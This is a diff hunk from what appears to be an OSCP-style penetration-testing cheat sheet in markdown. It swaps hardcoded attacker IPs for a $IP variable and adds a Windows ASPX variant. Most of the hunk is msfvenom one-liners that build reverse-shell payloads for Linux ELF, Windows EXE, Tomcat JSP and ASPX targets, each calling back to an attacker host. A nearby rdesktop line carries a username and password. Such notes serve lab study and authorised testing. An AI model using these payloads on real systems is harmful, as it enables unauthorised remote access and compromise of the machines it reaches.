@@ -417,17 +417,21 @@ rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
 ````
 https://github.com/frizb/MSF-Venom-Cheatsheet
 ````
-### Windows 64 bit
-````
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
-````
 ### Linux 64 bit PHP
 ````
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.168 LPORT=443 -f elf > shell.php
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf > shell.php
+````
+### Windows 64 bit
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
 ### Windows 64 bit apache tomcat
 ````
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.168 LPORT=80 -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=80 -f raw > shell.jsp
+````
+### Windows 64 bit aspx
+````
+msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -o shell64.aspx
 ````
 ## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
 ### SMB Linux to Windows
